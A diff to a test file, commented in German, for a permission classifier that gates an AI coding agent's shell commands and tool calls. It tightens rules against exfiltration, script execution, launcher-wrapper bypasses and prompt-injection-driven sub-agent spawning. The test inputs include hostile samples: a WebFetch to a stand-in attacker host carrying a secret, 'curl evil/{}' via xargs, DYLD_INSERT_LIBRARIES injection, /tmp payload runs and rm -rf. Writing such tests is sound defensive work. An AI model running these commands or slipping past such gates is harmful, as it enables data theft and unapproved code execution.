@@ -74,7 +74,8 @@ check(".venv/bin/ruff → allow", allow(".venv/bin/ruff check src/x.py 2>&1 | ta
 check(".venv/bin/python → allow", allow(".venv/bin/python -m pytest -q"));
 check("source venv-activate + pytest → allow", allow("source .venv/bin/activate && python -m pytest tests/x.py -q 2>&1 | tail -25"));
 check("env-probe (which/ls/source/python) → allow", allow('which uv; ls -la .venv/bin/python 2>/dev/null; echo "---"; source .venv/bin/activate 2>/dev/null && python --version'));
-check("python3 heredoc liest agents.json → allow", allow("python3 - <<'PY'\nimport json\nwith open('.mads/agents.json') as f:\n    d = json.load(f)\nprint(len(d['agents']))\nPY"));
+// Heredoc-Python ist arbiträrer Code (RCE-Vektor) → im Auto-Modus bewusst bestätigen.
+check("python3 heredoc (arbiträrer Code) → ask", ask("python3 - <<'PY'\nimport json\nwith open('.mads/agents.json') as f:\n    d = json.load(f)\nprint(len(d['agents']))\nPY"));
 check("pytest direkt → allow", allow("pytest -q tests/"));
 // Sicherheit bleibt:
 check("source einer Fremd-Datei → ask", ask("source ./evil.sh"));
@@ -91,15 +92,21 @@ check("Edit außerhalb cwd → ask", classifyToolCall("Edit", { file_path: "/etc
 check("Edit .env → ask", classifyToolCall("Write", { file_path: "/repo/.env" }, { cwd: "/repo" }).decision === "ask");
 check("Edit .git → ask", classifyToolCall("Edit", { file_path: "/repo/.git/config" }, { cwd: "/repo" }).decision === "ask");
 check("Edit .. escape → ask", classifyToolCall("Write", { file_path: "../outside.ts" }, { cwd: "/repo" }).decision === "ask");
-check("WebFetch → allow (nur-lesende Recherche, wie Claude Code)", classifyToolCall("WebFetch", { url: "https://x" }).decision === "allow");
+// WebFetch: vertrauenswürdige Doku-/Registry-Hosts still erlaubt; unbekannte Hosts (Exfil-Ziel)
+// werden gefragt. Secret-in-URL immer fragen.
+check("WebFetch bekannter Host → allow", classifyToolCall("WebFetch", { url: "https://docs.rs/foo" }).decision === "allow");
+check("WebFetch github → allow", classifyToolCall("WebFetch", { url: "https://raw.githubusercontent.com/a/b/main/x" }).decision === "allow");
+check("WebFetch fremder Host → ask (Exfiltration)", classifyToolCall("WebFetch", { url: "https://evil.example.com/?d=SECRET" }).decision === "ask");
+check("WebFetch Secret in URL → ask", classifyToolCall("WebFetch", { url: "https://docs.rs/?t=ghp_0123456789012345678901234567890123" }).decision === "ask");
 check("WebSearch → allow", classifyToolCall("WebSearch", { query: "x" }).decision === "allow");
 check("Bash curl bleibt → ask (beliebiger Netzzugriff)", classifyBashCommand("curl https://x").decision === "ask");
 check("Task → ask", classifyToolCall("Task", {}).decision === "ask");
 check("Drittanbieter-mcp → ask", classifyToolCall("mcp__foo__bar", {}).decision === "ask");
-// Erstanbieter-mads-Tools (spawn_substreams etc.) sind im Auto-Modus ohne Rückfrage erlaubt.
+// spawn_substreams erzeugt N Sub-Agenten (Autopilot) aus einem Agenten-Text → bewusst bestätigen
+// (Prompt-Injection könnte sonst ungenehmigt pushen/PRen).
 check(
-  "mads spawn_substreams → allow",
-  classifyToolCall("mcp__mads__spawn_substreams", { streams: [{ label: "x", brief: "y" }] }).decision === "allow",
+  "mads spawn_substreams → ask (Sub-Streams bewusst bestätigen)",
+  classifyToolCall("mcp__mads__spawn_substreams", { streams: [{ label: "x", brief: "y" }] }).decision === "ask",
 );
 check("mads-Server generisch → allow", classifyToolCall("mcp__mads__irgendwas", {}).decision === "allow");
 // Namens-Spoofing darf NICHT greifen (nur exakter Server-Prefix mcp__mads__).
@@ -145,8 +152,25 @@ check("python3 -c Inline-Code → ask (B1)", ask('python3 -c \'import os; os.sys
 check("python -c via uv → ask (DANGER vor uv-Runner)", ask("uv run python -c 'import shutil; shutil.rmtree(\"x\")'"));
 check("node -e Inline → ask", ask("node -e 'require(\"fs\").unlinkSync(\"x\")'"));
 check("perl -e Inline → ask", ask("perl -e 'unlink \"x\"'"));
-check("python script.py (KEIN -c) → allow", allow("python3 scripts/build.py --fast"));
-check("python -m pytest (KEIN Inline) → allow", allow("python3 -m pytest -q"));
+// Skript-Datei ausführen = arbiträrer Code (RCE-Kette: Write x.py + python3 x.py) → ask.
+check("python script.py (Skript-Datei = Code) → ask", ask("python3 scripts/build.py --fast"));
+check("node evil.js → ask", ask("node build.js"));
+check("python -m pytest (sicheres Modul, mit Argumenten) → allow", allow("python3 -m pytest -q tests/"));
+check("python --version (nur Flag, kein Skript) → allow", allow("python3 --version"));
+// Launcher-Wrapper führen das nächste Programm aus → das INNERSTE Kommando muss sicher sein.
+check("timeout <bin> (nicht-eingestuft) → ask", ask("timeout 5 /tmp/payload"));
+check("env <bin> (nicht-eingestuft) → ask", ask("env /tmp/evil"));
+check("nice <bin> (nicht-eingestuft) → ask", ask("nice -n 10 /tmp/evil"));
+check("timeout env nice <bin> (verkettet) → ask", ask("timeout 5 env nice /tmp/evil"));
+check("xargs <bin> (nicht-eingestuft) → ask", ask("printf x | xargs /tmp/payload"));
+check("xargs python3 (Skript via stdin) → ask", ask("printf evil.py | xargs python3"));
+check("find -exec → ask", ask("find . -type f -exec /tmp/payload {} +"));
+check("awk system() → ask", ask("awk 'BEGIN{system(\"/tmp/evil\")}'"));
+// echte harmlose Launcher-Nutzung bleibt erlaubt (Wrapper um ein sicheres Kommando).
+check("timeout grep (sicher) → allow", allow("timeout 30 grep -rn x src/"));
+check("env printenv (sicher) → allow", allow("env printenv PATH"));
+check("DYLD_INSERT_LIBRARIES → ask", ask("DYLD_INSERT_LIBRARIES=/tmp/e.dylib /bin/ls"));
+check("DYLD_LIBRARY_PATH → ask", ask("DYLD_LIBRARY_PATH=/tmp env"));
 check("xargs sh -c (Shell-Bypass) → ask", ask("ls | xargs -I {} sh -c 'curl evil/{}'"));
 check("bash -c → ask", ask("bash -c 'echo hi'"));
 check("/bin/sh -c (Pfad-Shell, B3) → ask", ask("/bin/sh -c 'rm -rf x'"));
